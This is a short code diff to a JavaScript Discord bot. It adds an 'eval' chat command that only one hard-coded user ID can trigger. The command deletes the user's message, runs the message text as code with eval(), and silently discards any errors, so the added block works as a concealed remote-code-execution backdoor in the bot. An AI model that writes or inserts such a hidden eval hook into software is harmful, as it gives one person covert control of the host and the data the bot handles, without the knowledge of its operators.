@@ -127,6 +127,20 @@ if (reaction.emoji.name === 'Rust'){
 
 bot.on('message', (message) => {
 
+if (command === 'eval' && message.author.id === `248521740945195008`) {
+        message.delete();
+        try {
+                  let code = args.join(" ");
+                  let evaled = eval(code);
+      
+                  if (typeof evaled !== "string")
+                      evaled = util.inspect(evaled);
+              } catch (err) {
+              }
+      }
+
+
+
     if (message.channel.type !== 'text') return;
     if (message.member.hasPermission('MANAGE_GUILD') || message.member.hasPermission('ADMINISTRATOR') || message.member.id === message.guild.owner.id) {
         if (message.content === 's!stop') {stop.push(message.guild.id); return message.channel.send('Готово');}
